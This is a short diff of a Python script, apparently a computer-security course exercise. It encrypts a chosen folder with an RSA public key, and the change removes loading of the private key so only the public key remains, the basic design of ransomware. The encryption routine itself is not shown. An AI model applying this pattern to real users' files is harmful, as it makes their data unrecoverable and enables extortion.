@@ -61,24 +61,23 @@ def generate_rsa_keys():
 
 # Load RSA keys from files
 def load_rsa_keys():
-    with open("private.pem", 'rb') as f:
-        private_key = RSA.import_key(f.read())
+    #with open("private.pem", 'rb') as f:
+       # private_key = RSA.import_key(f.read())
     
     with open("public.pem", 'rb') as f:
         public_key = RSA.import_key(f.read())
     
-    return public_key, private_key
+    return public_key
 
 
 # Main encryption process
 if __name__ == "__main__":
-    folder_to_encrypt = "C:\\Users\\ts1506\\Desktop\\Security"
-
+    folder_to_encrypt = "C:\\Jason\\Computer Security"
     # Generate or load RSA keys
-    if not os.path.exists("private.pem") or not os.path.exists("public.pem"):
+    if  not os.path.exists("public.pem"):
         public_key, private_key = generate_rsa_keys()
     else:
-        public_key, private_key = load_rsa_keys()
+     public_key = load_rsa_keys()
 
     # Encrypt the folder
     encrypt_folder(folder_to_encrypt, public_key)
